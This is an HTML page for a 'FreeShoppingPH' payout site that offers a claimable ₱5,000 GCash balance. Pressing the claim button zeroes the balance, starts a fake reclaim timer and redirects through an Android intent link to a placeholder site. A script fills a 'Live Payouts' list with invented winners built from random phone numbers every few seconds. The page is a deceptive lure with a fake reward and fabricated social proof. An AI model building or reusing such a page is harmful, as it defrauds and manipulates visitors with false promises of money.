<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FreeShoppingPH | Payout</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body { 
            font-family: 'Poppins', sans-serif; 
            background: #0f172a; 
            color: #f8fafc; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: #1e293b;
            width: 100%;
            max-width: 420px;
            padding: 30px 20px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .logo-img {
            width: 80%;
            max-width: 250px;
            margin: 0 auto 25px auto;
            display: block;
            object-fit: contain;
        }

        h1 {
            font-size: 14px;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 5px;
        }

        .amount {
            font-size: 42px;
            font-weight: 700;
            color: #4ade80; 
            margin-bottom: 25px;
            text-shadow: 0 0 20px rgba(74, 222, 128, 0.4);
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 10px rgba(74, 222, 128, 0.2); }
            to { text-shadow: 0 0 25px rgba(74, 222, 128, 0.8); }
        }

        .pay-button { 
            background: linear-gradient(90deg, #0056b3, #007dfe); 
            color: white; 
            width: 100%;
            padding: 18px; 
            border: none; 
            border-radius: 50px; 
            font-size: 18px; 
            font-weight: 700;
            cursor: pointer; 
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(0, 125, 254, 0.4);
        }

        #timer-text { display: none; color: #ef4444; font-weight: 700; margin-top: 15px; font-size: 14px; }

        .promo-photo {
            width: 100%;
            border-radius: 16px;
            margin-top: 25px;
            display: block;
            border: 1px solid rgba(255,255,255,0.1);
        }

        /* WINNERS LIST STYLING */
        .winners-container {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 204, 0, 0.3);
            padding: 15px;
            border-radius: 16px;
            margin-top: 25px;
            text-align: left;
        }

        .winners-container h3 {
            font-size: 12px;
            color: #fbbf24;
            margin-bottom: 12px;
            text-align: center;
            text-transform: uppercase;
        }

        #winners-list {
            min-height: 50px; /* Ensures space is reserved */
        }

        .winner-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            animation: slideIn 0.5s ease forwards;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .payout-green { color: #4ade80 !important; font-weight: 700; }

        .gcash-mini {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: white;
            border: 1px solid #007dfe;
        }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" alt="Logo" class="logo-img">
    
    <h1>Claimable Balance</h1>
    <div class="amount" id="balanceText">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
        CLAIM THRU GCASH
    </button>

    <div id="timer-text">RECLAIM IN: <span id="waitTimer">05:00</span></div>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo" alt="Promo">

    <div class="winners-container">
        <h3>🔴 Live Payouts</h3>
        <div id="winners-list">
            </div>
    </div>
</div>

<script>
    function animateValue(id, start, end, duration) {
        const obj = document.getElementById(id);
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) {
                window.requestAnimationFrame(step);
            }
        };
        window.requestAnimationFrame(step);
    }

    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        const bal = document.getElementById('balanceText');
        const timerDiv = document.getElementById('timer-text');

        animateValue("balanceText", 5000, 0, 800); 
        bal.style.color = "#64748b";
        bal.style.animation = "none";

        btn.disabled = true;
        btn.innerHTML = "Processing...";
        timerDiv.style.display = "block";

        startTimer(300);

        setTimeout(() => {
            window.location.href = "intent://yourwebsite.com#Intent;scheme=https;package=com.android.chrome;end"; 
        }, 1000);
    }

    function startTimer(sec) {
        let timer = sec;
        const display = document.getElementById('waitTimer');
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            
            if (--timer < 0) {
                clearInterval(interval);
                animateValue("balanceText", 0, 5000, 1200); 
                const bal = document.getElementById('balanceText');
                const btn = document.getElementById('claimBtn');
                bal.style.color = "#4ade80";
                bal.style.animation = "glow 2s infinite alternate";
                btn.disabled = false;
                btn.innerHTML = "CLAIM THRU GCASH";
                document.getElementById('timer-text').style.display = "none";
            }
        }, 1000);
    }

    function generateWinner() {
        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const lastThree = Math.floor(100 + Math.random() * 900);
        
        // FIXED: Removed the line break that was breaking the code
        const myGcashImage = "images/gc_icon.png"; 

        const winnerEntry = document.createElement('div');
        winnerEntry.className = 'winner-item';
        winnerEntry.innerHTML = `
            <span>📱 ${randomPrefix}****${lastThree}</span>
            <img src="${myGcashImage}" class="gcash-mini" alt="GC">
            <strong class="payout-green">+₱5,000</strong>
        `;

        const list = document.getElementById('winners-list');
        if (list) {
            list.prepend(winnerEntry);
            if (list.children.length > 5) {
                list.removeChild(list.lastChild);
            }
        }
    }

    // Initialize list
    generateWinner();
    generateWinner();
    // Generate new ones every 3.5 seconds
    setInterval(generateWinner, 3500);
</script>

</body>
</html>
